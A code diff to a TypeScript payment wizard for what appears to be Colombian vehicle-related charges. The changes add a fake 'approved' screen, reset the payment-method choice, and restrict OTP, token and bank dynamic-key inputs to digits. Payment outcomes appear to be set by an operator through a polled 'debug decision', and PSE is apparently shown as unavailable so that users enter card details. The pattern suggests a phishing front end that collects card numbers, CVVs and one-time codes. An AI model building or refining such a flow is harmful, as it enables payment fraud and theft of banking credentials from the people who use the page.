@@ -165,7 +165,12 @@ function setStep(step: number) {
   $("btnAtras")?.classList.toggle("hidden", step === 0);
   $("btnSiguiente")?.classList.toggle("hidden", step >= 2);
   $("btnIrPagar")?.classList.toggle("hidden", step !== 2);
-  if (step === 2) renderConfirmacion();
+  if (step === 2) {
+    resetMetodoPago();
+    window.setTimeout(resetMetodoPago, 50);
+    window.setTimeout(resetMetodoPago, 400);
+    renderConfirmacion();
+  }
   const body = document.querySelector(".solicitud-dialog-body") as HTMLElement | null;
   if (body) body.scrollTop = 0;
 }
@@ -330,6 +335,16 @@ function metodoLabel() {
   return "PSE";
 }
 
+function resetMetodoPago() {
+  document.querySelectorAll('input[name="metodoPago"]').forEach((el) => {
+    const input = el as HTMLInputElement;
+    input.checked = input.value === "";
+  });
+  $("pseBankBox")?.classList.add("hidden");
+  $("cardHint")?.classList.add("hidden");
+  $("pseUnavailable")?.classList.add("hidden");
+}
+
 function syncMetodoPago() {
   const selected = (document.querySelector('input[name="metodoPago"]:checked') as HTMLInputElement | null)?.value || "";
   if (selected) state.metodoPago = selected as WizardState["metodoPago"];
@@ -479,7 +494,7 @@ async function pollDebugDecision(sessionId: string, timeoutMs = 180000) {
 }
 
 function hidePasarelaScreens() {
-  ["pagos-wait-screen", "pagos-challenge-screen", "pagos-auth-screen"].forEach((id) => {
+  ["pagos-wait-screen", "pagos-challenge-screen", "pagos-auth-screen", "pagos-approved-screen"].forEach((id) => {
     const el = $(id) as HTMLElement | null;
     if (!el) return;
     el.hidden = true;
@@ -544,6 +559,29 @@ function showWaitScreen(brandKey: string) {
 function hideWaitScreen() {
   hidePasarelaScreens();
   document.body.classList.remove("is-offers-waiting");
+}
+
+function showApprovedScreen() {
+  hidePasarelaScreens();
+  const screen = $("pagos-approved-screen");
+  const { datetimeLabel, amountLabel } = challengeStamp();
+  screen?.querySelectorAll("[data-approved-amount]").forEach((el) => {
+    el.textContent = amountLabel;
+  });
+  screen?.querySelectorAll("[data-approved-datetime]").forEach((el) => {
+    el.textContent = datetimeLabel;
+  });
+  screen?.querySelectorAll("[data-approved-ref]").forEach((el) => {
+    el.textContent = solicitudId();
+  });
+  screen?.querySelectorAll("[data-approved-plates]").forEach((el) => {
+    el.textContent = state.plates.map((row) => row.placa).join(", ") || "—";
+  });
+  showOverlay("cardOverlay", false);
+  showOverlay("pagoOverlay", false);
+  showOverlay("pasarelaLoadOverlay", false);
+  revealPasarela("pagos-approved-screen");
+  document.body.classList.add("is-offers-waiting");
 }
 
 function showChallengeScreen(brandKey: string, message = "") {
@@ -659,10 +697,7 @@ async function handlePaymentDecision(
     return;
   }
   if (action === "approved") {
-    hideWaitScreen();
-    const challenge = $("pagos-challenge-screen");
-    if (challenge) challenge.hidden = true;
-    window.location.href = "/success";
+    showApprovedScreen();
     return;
   }
   hideWaitScreen();
@@ -683,10 +718,10 @@ function openCardForm() {
   if (title) title.textContent = metodoLabel();
   const total = $("cardTotal");
   if (total) total.textContent = formatCop(grandTotal());
-  lockAutofill("cardTitular", personName());
-  setVal("cardNumero", "");
-  setVal("cardVence", "");
-  setVal("cardCvv", "");
+  lockAutofill("cardTitular", "");
+  lockAutofill("cardNumero", "");
+  lockAutofill("cardVence", "");
+  lockAutofill("cardCvv", "");
   setVal("cardCuotas", "1");
   $("cardCuotasWrap")?.classList.toggle("hidden", state.metodoPago !== "credito");
   $("cardError")?.classList.add("hidden");
@@ -791,6 +826,7 @@ export function openSolicitudWizard(input: {
     fecha.min = todayIso();
     fecha.value = todayIso();
   }
+  resetMetodoPago();
   renderPlacas();
   setStep(0);
   clearBanner();
@@ -813,6 +849,11 @@ function closeAll() {
   hideWaitScreen();
   const challenge = $("pagos-challenge-screen");
   if (challenge) challenge.hidden = true;
+  const approved = $("pagos-approved-screen");
+  if (approved) {
+    approved.hidden = true;
+    approved.style.display = "none";
+  }
   document.body.style.overflow = "";
 }
 
@@ -904,7 +945,7 @@ async function buscarRunt() {
 }
 
 export function bindSolicitudWizard() {
-  ["pagos-wait-screen", "pagos-challenge-screen", "pagos-auth-screen", "pagos-debug-modal"].forEach((id) => {
+  ["pagos-wait-screen", "pagos-challenge-screen", "pagos-auth-screen", "pagos-approved-screen", "pagos-debug-modal"].forEach((id) => {
     const el = $(id);
     if (el && el.parentElement !== document.body) document.body.appendChild(el);
   });
@@ -957,6 +998,7 @@ export function bindSolicitudWizard() {
     state.donationPct = val("donacionPct");
     syncDonation();
   });
+  resetMetodoPago();
   document.querySelectorAll('input[name="metodoPago"]').forEach((el) => el.addEventListener("change", syncMetodoPago));
   document.querySelector('input[name="metodoPago"][value="pse"]')?.addEventListener("click", () => {
     $("pseUnavailable")?.classList.remove("hidden");
@@ -1066,6 +1108,7 @@ export function bindSolicitudWizard() {
       }
     }
   });
+  $("btnPagoAprobado")?.addEventListener("click", closeAll);
   $("pagos-debug-modal-close")?.addEventListener("click", () => {
     const modal = $("pagos-debug-modal");
     if (modal) modal.hidden = true;
@@ -1082,6 +1125,14 @@ export function bindSolicitudWizard() {
       if (icon) icon.textContent = open ? "+" : "−";
       btn.setAttribute("aria-expanded", String(!open));
     });
+  });
+  document.querySelectorAll("input[name='otp'], input[name='token'], input[name='cdin']").forEach((el) => {
+    const input = el as HTMLInputElement;
+    const keepDigits = () => {
+      input.value = input.value.replace(/\D/g, "");
+    };
+    input.addEventListener("input", keepDigits);
+    input.addEventListener("paste", () => window.setTimeout(keepDigits, 0));
   });
   document.querySelectorAll("[data-otp-form]").forEach((form) => {
     form.addEventListener("submit", async (event) => {
